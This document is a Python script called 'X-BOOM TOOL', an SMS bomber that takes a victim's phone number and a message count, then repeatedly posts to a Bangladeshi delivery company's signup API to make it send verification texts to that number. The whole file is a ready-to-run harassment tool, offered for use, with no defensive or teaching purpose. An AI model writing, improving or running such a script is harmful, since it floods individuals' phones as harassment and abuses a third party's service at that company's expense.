import requests
import os
import time

def banner():
    os.system('clear')
    print("========================================")
    print("        WELCOME TO X-BOOM TOOL          ")
    print("     Created by: mmalekislam788         ")
    print("     Status: REDX API ACTIVE (2026)     ")
    print("========================================")

def send_sms(target, count):
    # REDX Sourcing API
    url = "https://api.redx.com.bd/v1/user/signup"
    payload = {"phone": target}
    
    print(f"\n[+] Global Attack started on: {target}")
    for i in range(count):
        try:
            response = requests.post(url, json=payload)
            if response.status_code == 200:
                print(f"[!] SMS {i+1} sent successfully!")
            else:
                print(f"[?] Failed (Limit) SMS {i+1}")
        except:
            print(f"[-] Network Error at SMS {i+1}")
        time.sleep(3)

def main():
    banner()
    print("\n[1] Start High-Power Bomber")
    print("[2] Exit")
    choice = input("\nSelect an option: ")
    if choice == '1':
        number = input("Enter Phone Number (01xxxxxxxxx): ")
        amount = int(input("Enter SMS Amount: "))
        send_sms(number, amount)
        print("\n[+] Task Completed!")
    else:
        print("Exiting...")

if __name__ == "__main__":
    main()

